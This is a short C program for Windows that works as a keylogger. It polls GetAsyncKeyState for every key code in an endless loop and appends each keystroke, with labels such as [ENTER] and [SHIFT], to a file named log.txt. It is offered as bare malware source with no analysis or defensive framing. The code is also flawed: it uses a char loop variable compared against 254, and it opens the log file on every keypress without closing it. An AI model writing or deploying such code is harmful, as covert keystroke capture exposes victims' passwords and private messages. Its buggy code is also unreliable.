#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void startLogging();

int main (){
    startLogging();
}

void startLogging() {
    char c;
    while (TRUE){
        for(c = 0; c <=254; c++) {
            if(GetAsyncKeyState(c) & 0x1) {
                FILE *log = fopen("log.txt", "a");
                switch (c) {
                 case VK_BACK:
                    fprintf(log, "[BACKSPACE]");
                      break;
                  case VK_RETURN:
                      fprintf(log, "[ENTER]");
                    break;
                 case VK_SHIFT:
                    fprintf(log, "[SHIFT]");
                    break;
                case VK_CONTROL:
                    fprintf(log, "[CONTROL]");
                    break;
                case VK_CAPITAL:
                    fprintf(log, "[CAPS LOCK]");
                    break;
                 case VK_TAB:
                    fprintf(log, "[TAB]");
                    break;
                case VK_MENU:
                    fprintf(log, "[ALT]");
                    break;
                case VK_LBUTTON:
                case VK_RBUTTON:
                    break;
                default:
                    fprintf(log, "%c", c);
                }
            }
        }
    }
 }

